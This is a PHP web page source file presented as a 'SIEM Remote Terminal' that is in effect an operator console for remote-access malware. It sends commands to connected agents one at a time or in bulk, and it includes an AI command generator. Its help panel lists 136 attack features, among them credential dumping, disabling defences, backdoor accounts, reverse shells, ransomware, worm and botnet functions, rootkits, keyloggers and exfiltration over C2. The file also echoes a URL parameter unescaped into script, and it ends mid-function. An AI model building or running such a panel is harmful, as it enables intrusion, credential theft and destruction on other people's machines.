<?php
/**
 * SIEM Remote Terminal Interface
 * Execute shell commands on remote PCs and view output
 */

session_start();

// Disable caching
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

// Check if logged in
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$agent = $_GET['agent'] ?? '';
$prefill_cmd = $_GET['cmd'] ?? '';
$v = time(); // Force cache bust
?>
<!DOCTYPE html>
<html>
<head>
    <title>SIEM Remote Terminal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #0a0e27; 
            color: #00ff00;
        }
        .topnav {
            background: #0066cc;
            padding: 12px 20px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
        }
        .topnav .brand { font-size: 18px; font-weight: bold; }
        .topnav .menu { display: flex; gap: 14px; flex-wrap: wrap; align-items: center; }
        .topnav .menu a { color: white; text-decoration: none; font-weight: 700; font-family: 'Segoe UI', Arial, sans-serif; font-size: 13px; opacity: 0.95; }
        .topnav .menu a.active { text-decoration: underline; }
        .topnav .menu a:hover { opacity: 1; }
        .container { display: flex; height: 100vh; }
        
        .sidebar {
            width: 250px;
            background: #0f1419;
            border-right: 1px solid #333;
            overflow-y: auto;
            padding: 20px;
        }
        
        .sidebar h3 {
            color: #0066cc;
            margin-bottom: 15px;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        .agent-list {
            list-style: none;
        }
        
        .agent-item {
            padding: 10px;
            margin-bottom: 8px;
            background: #1a1f26;
            border-radius: 4px;
            cursor: pointer;
            border-left: 3px solid #333;
            transition: all 0.3s;
        }
        
        .agent-item:hover {
            background: #2a2a2a;
            border-left-color: #0066cc;
        }
        
        .agent-item.active {
            background: #0066cc;
            border-left-color: #00d4ff;
        }
        
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: #0066cc;
            padding: 20px;
            border-bottom: 1px solid #004499;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 5px;
            color: white;
        }
        
        .header p {
            font-size: 12px;
            opacity: 0.9;
            color: white;
        }
        
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 20px;
            overflow: hidden;
        }
        
        .terminal {
            flex: 1;
            background: #0a0e27;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 15px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .terminal-line {
            margin-bottom: 5px;
            word-wrap: break-word;
        }
        
        .terminal-prompt {
            color: #00ff00;
            font-weight: bold;
        }
        
        .terminal-input {
            color: #00ff00;
        }
        
        .terminal-output {
            color: #00ff00;
        }
        
        .terminal-error {
            color: #ff3333;
        }
        
        .terminal-status {
            color: #ffff00;
        }
        
        .input-area {
            display: flex;
            gap: 10px;
            align-items: flex-start;
        }
        
        .input-group {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .input-group input {
            padding: 10px;
            background: #1a1f26;
            border: 1px solid #333;
            color: #00ff00;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        
        .input-group input::placeholder {
            color: #666;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 5px rgba(0, 102, 204, 0.3);
        }
        
        .btn {
            padding: 10px 20px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 13px;
            transition: background 0.3s;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        .btn:hover {
            background: #004499;
        }
        
        .btn-clear {
            background: #333;
        }
        
        .btn-clear:hover {
            background: #444;
        }
        
        .status-bar {
            padding: 10px 15px;
            background: #1a1f26;
            border-top: 1px solid #333;
            font-size: 12px;
            color: #999;
        }
        
        .no-agent {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #666;
            font-size: 16px;
        }
        
        .command-history {
            display: flex;
            gap: 5px;
            margin-top: 10px;
            flex-wrap: wrap;
        }
        
        .history-btn {
            padding: 5px 10px;
            background: #1a1f26;
            border: 1px solid #333;
            color: #00ff00;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px;
            font-family: 'Courier New', monospace;
        }
        
        .history-btn:hover {
            background: #2a2a2a;
            border-color: #0066cc;
        }
        
        .help-panel {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            overflow-y: auto;
        }
        
        .help-content {
            background: #0a0e27;
            margin: 20px auto;
            padding: 30px;
            max-width: 900px;
            border: 1px solid #333;
            border-radius: 4px;
            color: #00ff00;
        }
        
        .help-content h2 {
            color: #0066cc;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        
        .help-section {
            margin-bottom: 25px;
        }
        
        .help-section h3 {
            color: #00d4ff;
            margin-bottom: 10px;
            font-size: 14px;
        }
        
        .help-command {
            margin-left: 20px;
            margin-bottom: 8px;
            font-size: 12px;
            line-height: 1.5;
        }
        
        .help-close {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #0066cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            z-index: 1001;
        }
        
        .help-close:hover {
            background: #004499;
        }

        .bulk-bar {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
            margin-top: 12px;
            padding: 10px;
            background: #0f1419;
            border: 1px solid #333;
            border-radius: 4px;
        }

        .bulk-bar .bulk-count {
            font-size: 12px;
            color: #999;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        .bulk-bar input {
            padding: 10px;
            background: #1a1f26;
            border: 1px solid #333;
            color: #00ff00;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            min-width: 320px;
            flex: 1;
        }

        .bulk-actions {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }

        .agent-item .agent-row {
            display: flex;
            gap: 10px;
            align-items: flex-start;
        }

        .agent-item input[type="checkbox"] {
            margin-top: 4px;
        }

        .bulk-results {
            margin-top: 10px;
            padding: 10px;
            background: #0f1419;
            border: 1px solid #333;
            border-radius: 4px;
            overflow: auto;
            max-height: 220px;
        }

        .bulk-results table {
            width: 100%;
            border-collapse: collapse;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-size: 12px;
            color: #b0b8c1;
        }

        .bulk-results th,
        .bulk-results td {
            padding: 6px 8px;
            border-bottom: 1px solid #222;
            vertical-align: top;
        }

        .bulk-results th {
            color: #00d4ff;
            font-weight: 700;
            text-align: left;
            position: sticky;
            top: 0;
            background: #0f1419;
        }

        .bulk-pill {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 999px;
            font-size: 11px;
            font-weight: 700;
            border: 1px solid #333;
        }

        .bulk-pill.pending { color: #ffff00; border-color: #665500; }
        .bulk-pill.success,
        .bulk-pill.completed { color: #00cc66; border-color: #006633; }
        .bulk-pill.failed,
        .bulk-pill.error { color: #ff3333; border-color: #660000; }

        .bulk-output {
            white-space: pre-wrap;
            max-width: 900px;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 11px;
        }
    </style>

    <script>
        function base64ToBlob(base64, contentType) {
            const byteCharacters = atob(base64);
            const byteArrays = [];
            const sliceSize = 1024;
            for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
                const slice = byteCharacters.slice(offset, offset + sliceSize);
                const byteNumbers = new Array(slice.length);
                for (let i = 0; i < slice.length; i++) {
                    byteNumbers[i] = slice.charCodeAt(i);
                }
                byteArrays.push(new Uint8Array(byteNumbers));
            }
            return new Blob(byteArrays, { type: contentType || 'application/octet-stream' });
        }

        function downloadBase64File(base64, filename, contentType) {
            try {
                const blob = base64ToBlob(base64, contentType);
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = filename;
                document.body.appendChild(link);
                link.click();
                link.remove();
                setTimeout(() => URL.revokeObjectURL(url), 5000);
            } catch (e) {
                const link = document.createElement('a');
                link.href = `data:${contentType || 'application/octet-stream'};base64,${base64}`;
                link.download = filename;
                link.click();
            }
        }

        function base64ToObjectUrl(base64, contentType) {
            try {
                const blob = base64ToBlob(base64, contentType);
                return URL.createObjectURL(blob);
            } catch (e) {
                return `data:${contentType || 'application/octet-stream'};base64,${base64}`;
            }
        }
    </script>
</head>
<body>
    <div class="topnav">
        <div class="brand">Remote Terminal</div>
        <div class="menu">
            <a href="dashboard.php">Dashboard</a>
            <a href="events.php">Events</a>
            <a href="threats.php">Threats</a>
            <a href="remote-terminal.php" class="active">Remote Terminal</a>
            <a href="task-manager.php">Task Manager</a>
            <a href="settings.php">Settings</a>
            <a href="?logout=1">Logout</a>
        </div>

    <script>
        const PREFILL_AGENT = <?php echo json_encode((string)$agent); ?>;
        const PREFILL_CMD = <?php echo json_encode((string)$prefill_cmd); ?>;
    </script>
    </div>
    <div class="container">
        <!-- Sidebar with agent list -->
        <div class="sidebar">
            <h3>Connected Agents</h3>
            <ul class="agent-list" id="agentList">
                <li style="color: #666; text-align: center; padding: 20px;">Loading...</li>
            </ul>
        </div>
        
        <!-- Main content -->
        <div class="main">
            <!-- Header -->
            <div class="header">
                <h1>Remote Terminal</h1>
                <p id="agentInfo">Select an agent to begin remote terminal access</p>
            </div>
            
            <!-- Content -->
            <div class="content">
                <div class="terminal" id="terminal">
                    <div class="terminal-line no-agent">Select an agent from the list to start</div>
                </div>
                
                <!-- Input Area -->
                <div class="input-area">
                    <div class="input-group">
                        <input type="text" id="commandInput" placeholder="Enter command (help for all features, or try: screenshot, whoami, tasklist, ipconfig, etc.)..." style="width: 100%;">
                        <div class="command-history" id="commandHistory"></div>
                    </div>
                    <button class="btn" onclick="executeCommand()" style="height: 40px;">Execute</button>
                    <button class="btn btn-clear" onclick="openAiCrafter()" style="height: 40px;">Chat</button>
                    <button class="btn btn-clear" onclick="forceCleanupAgent()" style="height: 40px;">Force Cleanup (Agent)</button>
                    <button class="btn btn-clear" onclick="forceCleanupAll()" style="height: 40px;">Force Cleanup (All)</button>
                    <button class="btn btn-clear" onclick="showHelp()" style="height: 40px;">Help</button>
                    <button class="btn btn-clear" onclick="clearTerminal()" style="height: 40px;">Clear</button>
                </div>

                <div class="bulk-bar">
                    <div class="bulk-count" id="bulkCount">Bulk: 0 selected</div>
                    <input type="text" id="bulkCommandInput" placeholder="Bulk command (sent to selected agents)..." />
                    <div class="bulk-actions">
                        <button class="btn" onclick="bulkSelectAll()" style="height: 40px;">Select All</button>
                        <button class="btn btn-clear" onclick="bulkClearSelection()" style="height: 40px;">Clear</button>
                        <button class="btn" onclick="executeBulkCommand()" style="height: 40px;">Send Bulk</button>
                    </div>
                </div>

                <div class="bulk-results" id="bulkResults" style="display:none;">
                    <table>
                        <thead>
                            <tr>
                                <th style="min-width:160px;">Agent</th>
                                <th style="min-width:90px;">Cmd ID</th>
                                <th style="min-width:90px;">Status</th>
                                <th>Output / Error (preview)</th>
                                <th style="min-width:120px;">Action</th>
                            </tr>
                        </thead>
                        <tbody id="bulkResultsBody"></tbody>
                    </table>
                </div>

                <div class="input-area" style="margin-top: 10px;">
                    <div class="input-group">
                        <input type="file" id="uploadFile" style="width: 100%;" />
                    </div>
                    <div class="input-group">
                        <input type="text" id="uploadDest" placeholder="Destination path (e.g. C:\\Temp\\file.bin)" style="width: 100%;" autocomplete="off" />
                    </div>
                    <button class="btn" onclick="uploadFileToAgent()" style="height: 40px;">Upload</button>
                </div>
                
                <!-- Status bar -->
                <div class="status-bar">
                    <span id="statusText">Ready. Select an agent to connect.</span>
                </div>
            </div>
        </div>
    </div>

    <div class="help-panel" id="aiCrafterPanel">
        <button class="help-close" onclick="closeAiCrafter()">✕ Close</button>
        <div class="help-content">
            <h2>AI Command Crafter</h2>
            <div class="help-section">
                <h3>Intent</h3>
                <div style="display:flex; gap:10px; flex-wrap:wrap;">
                    <input type="text" id="aiIntent" placeholder="Describe what you want to do (e.g. list services and restart mysql)" style="flex:1; min-width:320px; padding:10px; background:#1a1f26; border:1px solid #333; color:#00ff00; border-radius:4px; font-family:'Courier New', monospace;" />
                    <button class="btn" onclick="craftAiCommand()" style="height: 40px;">Generate</button>
                </div>
            </div>
            <div class="help-section">
                <h3>Suggested Command</h3>
                <input type="text" id="aiSuggested" placeholder="Suggested command will appear here" style="width:100%; padding:10px; background:#1a1f26; border:1px solid #333; color:#00ff00; border-radius:4px; font-family:'Courier New', monospace;" />
                <div style="margin-top:10px; display:flex; gap:10px; flex-wrap:wrap;">
                    <button class="btn" onclick="useAiCommand()" style="height: 40px;">Use in Terminal</button>
                    <button class="btn btn-clear" onclick="executeAiCommand()" style="height: 40px;">Use + Execute</button>
                </div>
                <div id="aiExplain" style="margin-top:10px; color:#999; font-size:12px;"></div>
                <div id="aiWarnings" style="margin-top:10px; color:#ffcc00; font-size:12px;"></div>
                <div id="aiStatus" style="margin-top:10px; color:#00d4ff; font-size:12px;"></div>
            </div>
        </div>
    </div>
    
    <!-- Help Panel -->
    <div class="help-panel" id="helpPanel">
        <button class="help-close" onclick="closeHelp()">✕ Close</button>
        <div class="help-content">
            <h2>🔧 Comprehensive Meterpreter-Like Shell - All Commands</h2>
            
            <div class="help-section">
                <h3>📁 FILE OPERATIONS</h3>
                <div class="help-command">download:&lt;path&gt; - Download file to admin's browser</div>
                <div class="help-command">upload:&lt;path&gt; - Upload file to remote machine</div>
            </div>
            
            <div class="help-section">
                <h3>🛡️ ANTI-FORENSICS</h3>
                <div class="help-command">forensics:clearlogs - Clear all Windows Event Logs</div>
                <div class="help-command">forensics:disabledefender - Disable Windows Defender</div>
                <div class="help-command">forensics:disablefirewall - Disable Windows Firewall</div>
                <div class="help-command">forensics:disableuac - Disable UAC</div>
            </div>
            
            <div class="help-section">
                <h3>⬆️ PRIVILEGE ESCALATION</h3>
                <div class="help-command">escalate:check - Check current privileges</div>
                <div class="help-command">escalate:uacbypass - UAC bypass methods</div>
                <div class="help-command">escalate:tokenimpersonate - Token impersonation</div>
            </div>
            
            <div class="help-section">
                <h3>🔓 BACKDOOR ACCOUNTS</h3>
                <div class="help-command">backdoor:create:username - Create admin backdoor account</div>
                <div class="help-command">backdoor:list - List all local user accounts</div>
            </div>
            
            <div class="help-section">
                <h3>🔍 DETECTION & EVASION</h3>
                <div class="help-command">detect:antivirus - Detect installed antivirus</div>
                <div class="help-command">detect:firewall - Check firewall status</div>
                <div class="help-command">detect:vpn - Detect VPN connections</div>
                <div class="help-command">detect:edr - Detect EDR/endpoint protection</div>
            </div>
            
            <div class="help-section">
                <h3>🔄 REVERSE SHELL</h3>
                <div class="help-command">reverse:setup:lhost:lport - Setup reverse shell listener</div>
                <div class="help-command">reverse:connect:lhost:lport - Connect reverse shell</div>
            </div>
            
            <div class="help-section">
                <h3>🌉 PORT FORWARDING</h3>
                <div class="help-command">portfwd:local:lport:rhost:rport - Local port forwarding</div>
                <div class="help-command">portfwd:remote:rport:lhost:lport - Remote port forwarding</div>
            </div>
            
            <div class="help-section">
                <h3>🕸️ WEB SHELLS</h3>
                <div class="help-command">webshell:deploy:asp - Deploy ASP.NET web shell</div>
                <div class="help-command">webshell:deploy:php - Deploy PHP web shell</div>
                <div class="help-command">webshell:deploy:jsp - Deploy JSP web shell</div>
            </div>
            
            <div class="help-section">
                <h3>🔎 ADVANCED RECONNAISSANCE</h3>
                <div class="help-command">recon:wifi - Enumerate WiFi networks</div>
                <div class="help-command">recon:bluetooth - Detect Bluetooth devices</div>
                <div class="help-command">recon:browser - Locate browser history</div>
                <div class="help-command">recon:usb - List connected USB drives</div>
                <div class="help-command">recon:shares - List network shares</div>
                <div class="help-command">recon:printers - Enumerate printers</div>
            </div>
            
            <div class="help-section">
                <h3>💉 PROCESS INJECTION</h3>
                <div class="help-command">inject:list - List processes for injection</div>
                <div class="help-command">inject:inject:pid:payload - Inject payload into process</div>
                <div class="help-command">inject:migrate - Migrate to different process</div>
            </div>
            
            <div class="help-section">
                <h3>🧠 MEMORY OPERATIONS</h3>
                <div class="help-command">memory:dump - Dump process memory</div>
                <div class="help-command">memory:patch - Patch memory to bypass security</div>
                <div class="help-command">memory:inject - Inject shellcode into memory</div>
                <div class="help-command">memory:reflective - Reflective DLL injection</div>
            </div>
            
            <div class="help-section">
                <h3>🔐 CREDENTIAL THEFT</h3>
                <div class="help-command">steal:ntlm - Dump NTLM hashes</div>
                <div class="help-command">steal:kerberos - Extract Kerberos tickets</div>
                <div class="help-command">steal:browser - Extract browser credentials</div>
                <div class="help-command">steal:ssh - Steal SSH keys</div>
                <div class="help-command">steal:api - Harvest API keys/tokens</div>
            </div>
            
            <div class="help-section">
                <h3>🔗 ADVANCED PERSISTENCE</h3>
                <div class="help-command">persist_adv:wmi - WMI event subscription persistence</div>
                <div class="help-command">persist_adv:com - COM object hijacking</div>
                <div class="help-command">persist_adv:ifeo - Image File Execution Options</div>
                <div class="help-command">persist_adv:dll - DLL search order hijacking</div>
                <div class="help-command">persist_adv:appinit - AppInit DLLs persistence</div>
                <div class="help-command">persist_adv:browser - Browser extension persistence</div>
            </div>
            
            <div class="help-section">
                <h3>↔️ LATERAL MOVEMENT</h3>
                <div class="help-command">lateral:pth:user:domain:hash - Pass-the-Hash</div>
                <div class="help-command">lateral:kerberoast:target - Kerberoasting</div>
                <div class="help-command">lateral:golden:domain - Golden ticket creation</div>
                <div class="help-command">lateral:silver:service:host - Silver ticket creation</div>
                <div class="help-command">lateral:overpass - Overpass-the-Hash</div>
            </div>
            
            <div class="help-section">
                <h3>🌐 NETWORK PIVOTING</h3>
                <div class="help-command">pivot:socks:port - SOCKS proxy server</div>
                <div class="help-command">pivot:dns:domain - DNS tunneling</div>
                <div class="help-command">pivot:http:url - HTTP tunneling</div>
                <div class="help-command">pivot:smb - SMB relay attack</div>
                <div class="help-command">pivot:llmnr - LLMNR/NBNS spoofing</div>
            </div>
            
            <div class="help-section">
                <h3>🛡️ ANTI-ANALYSIS</h3>
                <div class="help-command">anti:vm - VM detection</div>
                <div class="help-command">anti:sandbox - Sandbox detection</div>
                <div class="help-command">anti:debugger - Debugger detection</div>
                <div class="help-command">anti:analysis - Analysis tool detection</div>
                <div class="help-command">anti:signature - Signature evasion</div>
            </div>
            
            <div class="help-section">
                <h3>📤 DATA EXFILTRATION</h3>
                <div class="help-command">exfil:dns:data - DNS exfiltration</div>
                <div class="help-command">exfil:icmp:data - ICMP tunneling</div>
                <div class="help-command">exfil:http:url - HTTP exfiltration</div>
                <div class="help-command">exfil:email:address - Email exfiltration</div>
                <div class="help-command">exfil:cloud:service - Cloud storage exfiltration</div>
            </div>
            
            <div class="help-section">
                <h3>📊 SYSTEM MONITORING</h3>
                <div class="help-command">monitor:file - File system monitoring</div>
                <div class="help-command">monitor:registry - Registry monitoring</div>
                <div class="help-command">monitor:process - Process monitoring</div>
                <div class="help-command">monitor:network - Network monitoring</div>
                <div class="help-command">monitor:eventlog - Event log monitoring</div>
            </div>
            
            <div class="help-section">
                <h3>👻 STEALTH OPERATIONS</h3>
                <div class="help-command">stealth:hide_process:pid - Hide process</div>
                <div class="help-command">stealth:hide_file:path - Hide file</div>
                <div class="help-command">stealth:hide_registry:key - Hide registry key</div>
                <div class="help-command">stealth:hide_network - Hide network connections</div>
                <div class="help-command">stealth:hide_logs - Hide event logs</div>
            </div>
            
            <div class="help-section">
                <h3>🔧 KERNEL OPERATIONS</h3>
                <div class="help-command">kernel:load_driver - Load kernel driver</div>
                <div class="help-command">kernel:rootkit - Install rootkit</div>
                <div class="help-command">kernel:syscall_hook - Hook system calls</div>
                <div class="help-command">kernel:code_execution - Kernel-mode code execution</div>
            </div>
            
            <div class="help-section">
                <h3>⚠️ MALWARE CAPABILITIES</h3>
                <div class="help-command">malware:ransomware:dir - Ransomware functionality</div>
                <div class="help-command">malware:worm - Worm propagation</div>
                <div class="help-command">malware:botnet - Botnet capabilities</div>
                <div class="help-command">malware:ddos:target - DDoS functionality</div>
                <div class="help-command">malware:cryptominer - Cryptominer integration</div>
            </div>
            
            <div class="help-section">
                <h3>📸 MEDIA & UTILITIES</h3>
                <div class="help-command">screenshot - Capture remote screen</div>
                <div class="help-command">help / ? - Show this help</div>
            </div>
            
            <div class="help-section">
                <h3>💾 BASIC PERSISTENCE</h3>
                <div class="help-command">persist:registry - Add to Windows Run registry</div>
                <div class="help-command">persist:startup - Add to startup folder</div>
                <div class="help-command">persist:task - Create scheduled task</div>
            </div>
            
            <div class="help-section">
                <h3>🔑 CREDENTIAL DUMPING</h3>
                <div class="help-command">dump:lsass - Dump LSASS process</div>
                <div class="help-command">dump:sam - Dump SAM registry</div>
                <div class="help-command">dump:credentials - Dump stored credentials</div>
            </div>
            
            <div class="help-section">
                <h3>🔐 C2 COMMUNICATION</h3>
                <div class="help-command">encrypted_c2:server|message|key - Encrypted C2 communication</div>
                <div class="help-command">fallback_c2:primary|fallback1,fallback2 - Fallback C2 channels</div>
                <div class="help-command">beacon_heartbeat:server|interval - Beacon heartbeat mechanism</div>
            </div>
            
            <div class="help-section">
                <h3>📤 DATA EXFILTRATION ENHANCEMENT</h3>
                <div class="help-command">steganography_exfil:data|image - LSB steganography exfiltration</div>
                <div class="help-command">covert_channel_exfil:data|type - Covert channel exfiltration (timing/packet/storage)</div>
            </div>
            
            <div class="help-section">
                <h3>📊 SYSTEM MONITORING</h3>
                <div class="help-command">keylogger_start:output_file - Start keylogger</div>
                <div class="help-command">screen_recording:output_file|fps - Start screen recording</div>
            </div>
            
            <div class="help-section">
                <h3>🌐 NETWORK RECONNAISSANCE</h3>
                <div class="help-command">dns_enum:domain - DNS enumeration</div>
                <div class="help-command">ad_enum - Active Directory enumeration</div>
                <div class="help-command">bluetooth_enum - Bluetooth device enumeration</div>
                <div class="help-command">wifi_analysis - WiFi network analysis</div>
            </div>
            
            <div class="help-section">
                <h3>🔗 ADVANCED PERSISTENCE (3)</h3>
                <div class="help-command">image_hijacking:image|command - Image hijacking (JPEG/PNG execution)</div>
                <div class="help-command">ads_persistence:file|command - Alternate Data Streams persistence</div>
                <div class="help-command">print_spooler_persist:command - Print spooler persistence</div>
            </div>
            
            <div class="help-section">
                <h3>🛡️ ADVANCED EVASION (3)</h3>
                <div class="help-command">code_obfuscation:code|method - Code obfuscation (xor/rot13/custom)</div>
                <div class="help-command">api_hooking_evasion - API hooking evasion</div>
                <div class="help-command">behavior_detection_evasion - Behavior detection evasion</div>
            </div>
            
            <div class="help-section">
                <h3>↔️ LATERAL MOVEMENT ENHANCEMENT (2)</h3>
                <div class="help-command">kerberos_delegation:user|service - Kerberos delegation abuse</div>
                <div class="help-command">constrained_delegation:service - Constrained delegation exploitation</div>
            </div>
            
            <div class="help-section">
                <h3>🔐 CREDENTIAL MANAGEMENT (2)</h3>
                <div class="help-command">credential_caching:user|pass|domain - Credential caching and reuse</div>
                <div class="help-command">credential_guard_bypass - Credential Guard bypass</div>
            </div>
            
            <div class="help-section">
                <h3>⚙️ SYSTEM MANIPULATION (2)</h3>
                <div class="help-command">boot_sector_modification - Boot sector modification</div>
                <div class="help-command">mbr_uefi_manipulation - MBR/UEFI manipulation</div>
            </div>
            
            <div class="help-section">
                <h3>🦠 MALWARE DISTRIBUTION (2)</h3>
                <div class="help-command">self_replication:path - Self-replication mechanism</div>
                <div class="help-command">update_mechanism:server|version - Update/upgrade mechanism</div>
            </div>
            
            <div class="help-section">
                <h3>👻 FORENSICS EVASION (2)</h3>
                <div class="help-command">memory_wiping - Memory wiping on exit</div>
                <div class="help-command">artifact_cleanup - Artifact cleanup automation</div>
            </div>
            
            <div class="help-section">
                <h3>📝 ADVANCED EVASION TECHNIQUES</h3>
                <div class="help-command">amsi_bypass - AMSI bypass via reflection</div>
                <div class="help-command">etw_bypass - ETW bypass via reflection</div>
                <div class="help-command">defender_exclusion - Add Defender exclusions</div>
                <div class="help-command">signature_bypass - Signature evasion techniques</div>
            </div>
            
            <div class="help-section">
                <h3>💉 ADVANCED INJECTION (2)</h3>
                <div class="help-command">process_hollowing - Process hollowing technique</div>
                <div class="help-command">code_cave_injection - Code cave injection</div>
            </div>
            
            <div class="help-section">
                <h3>⚡ FILELESS EXECUTION (2)</h3>
                <div class="help-command">powershell_fileless - IEX PowerShell execution</div>
                <div class="help-command">wmi_fileless - WMI fileless execution</div>
            </div>
            
            <div class="help-section">
                <h3>🔧 LOLBAS (3)</h3>
                <div class="help-command">certutil_download - Certutil for file download</div>
                <div class="help-command">bitsadmin_download - BitsAdmin for file download</div>
                <div class="help-command">msiexec_execution - MSIExec for execution</div>
            </div>
            
            <div class="help-section">
                <h3>📋 ANTI-ANALYSIS (4)</h3>
                <div class="help-command">detect_vm_advanced - Advanced VM detection</div>
                <div class="help-command">detect_sandbox_advanced - Advanced sandbox detection</div>
                <div class="help-command">detect_debugger - Debugger detection</div>
                <div class="help-command">detect_analysis_tools - Analysis tool detection</div>
            </div>
            
            <div class="help-section">
                <h3>💉 PRIVILEGE ESCALATION EXPLOITS (3)</h3>
                <div class="help-command">kernel_exploit - Kernel privilege escalation</div>
                <div class="help-command">token_duplication:pid - Token duplication exploit</div>
                <div class="help-command">seimpersonate_abuse - SeImpersonate privilege abuse</div>
            </div>
            
            <div class="help-section" style="color: #ffff00; background: #1a1f26; padding: 10px; border-radius: 4px;">
                <h3>📊 TOTAL FEATURES: 136</h3>
                <div class="help-command">All features are fully integrated and remotely executable</div>
                <div class="help-command">Type any command above to execute it on the remote agent</div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedAgent = '<?php echo $agent; ?>';
        let commandHistory = [];
        let historyIndex = -1;

        const BASE_PATH = <?php echo json_encode(rtrim(dirname(dirname($_SERVER['SCRIPT_NAME'])), '/\\')); ?>;
        
        // Load agents on page load
        window.addEventListener('load', () => {
            loadAgents();
            if (selectedAgent) {
                selectAgent(selectedAgent);
            }
        });
        
        function loadAgents() {
            fetch(BASE_PATH + '/api/remote-access.php?action=get_agents')
                .then(r => r.json())
                .then(data => {
                    const list = document.getElementById('agentList');
                    list.innerHTML = '';
                    
                    if (data.agents && data.agents.length > 0) {
                        data.agents.forEach(agent => {
                            const li = document.createElement('li');
                            li.className = 'agent-item' + (agent.name === selectedAgent ? ' active' : '');
                            li.innerHTML = `
                                <div class="agent-row">
                                    <input type="checkbox" class="bulk-agent" data-agent="${escapeHtml(agent.name)}" onclick="event.stopPropagation(); updateBulkCount();" />
                                    <div>
                                        <div class="agent-name">${escapeHtml(agent.name)}</div>
                                        <div class="agent-status">
                                            <span class="status-${agent.status}">${agent.status}</span> • ${agent.events} events
                                        </div>
                                    </div>
                                </div>
                            `;
                            li.onclick = (e) => selectAgent(agent.name, e);
                            list.appendChild(li);
                        });
                    } else {
                        list.innerHTML = '<li style="color: #666; text-align: center; padding: 20px;">No agents connected</li>';
                    }
                    
                    // Auto-select agent from URL if provided
                    if (typeof PREFILL_AGENT === 'string' && PREFILL_AGENT.trim()) {
                        const match = data.agents.find(a => String(a.name).toLowerCase() === PREFILL_AGENT.toLowerCase());
                        if (match) {
                            selectAgent(match.name, null);
                            const activeEl = Array.from(document.querySelectorAll('.agent-item')).find(el => {
                                const nameEl = el.querySelector('.agent-name');
                                return nameEl && nameEl.textContent && nameEl.textContent.toLowerCase() === match.name.toLowerCase();
                            });
                            if (activeEl) {
                                activeEl.classList.add('active');
                            }
                        }
                    }

                    updateBulkCount();
                })
                .catch(err => {
                    const list = document.getElementById('agentList');
                    list.innerHTML = `<li style="color: #ff3333; text-align: center; padding: 20px;">Error loading agents</li>`;
                });
        }

        function getSelectedBulkAgents() {
            return Array.from(document.querySelectorAll('.bulk-agent:checked'))
                .map(el => (el.getAttribute('data-agent') || '').trim())
                .filter(a => a);
        }

        function updateBulkCount() {
            const countEl = document.getElementById('bulkCount');
            const selected = getSelectedBulkAgents();
            if (countEl) {
                countEl.textContent = `Bulk: ${selected.length} selected`;
            }
        }

        function bulkSelectAll() {
            document.querySelectorAll('.bulk-agent').forEach(cb => cb.checked = true);
            updateBulkCount();
        }

        function bulkClearSelection() {
            document.querySelectorAll('.bulk-agent').forEach(cb => cb.checked = false);
            updateBulkCount();
        }

        function executeBulkCommand() {
            const input = document.getElementById('bulkCommandInput');
            const command = (input ? input.value.trim() : '');
            const agents = getSelectedBulkAgents();

            if (!command) {
                alert('Please enter a bulk command');
                return;
            }
            if (!agents.length) {
                alert('Please select at least one agent');
                return;
            }

            if (!confirm(`Send command to ${agents.length} agents?\n\n${command}`)) {
                return;
            }

            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="terminal-prompt">$</span> <span class="terminal-input">bulk(${agents.length}): ${escapeHtml(command)}</span>`;
            terminal.appendChild(line);

            const statusLine = document.createElement('div');
            statusLine.className = 'terminal-line';
            statusLine.id = 'status-' + Date.now();
            statusLine.innerHTML = `<span class="terminal-status">Queuing bulk command...</span>`;
            terminal.appendChild(statusLine);
            terminal.scrollTop = terminal.scrollHeight;

            // IMPORTANT: Use the same API path as single-agent execution so the agent sees commands
            // (single-agent uses direct-command.php which writes to remote_commands table)
            const perAgentResults = [];
            let completed = 0;

            agents.forEach(agent => {
                fetch(`${BASE_PATH}/api/direct-command.php?action=execute&agent=${encodeURIComponent(agent)}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'rt:' + command})
                })
                .then(r => r.json())
                .then(data => {
                    perAgentResults.push({
                        agent: agent,
                        ok: data && data.status === 'ok',
                        command_id: data && data.command_id ? data.command_id : null,
                        error: data && data.error ? data.error : null
                    });
                })
                .catch(err => {
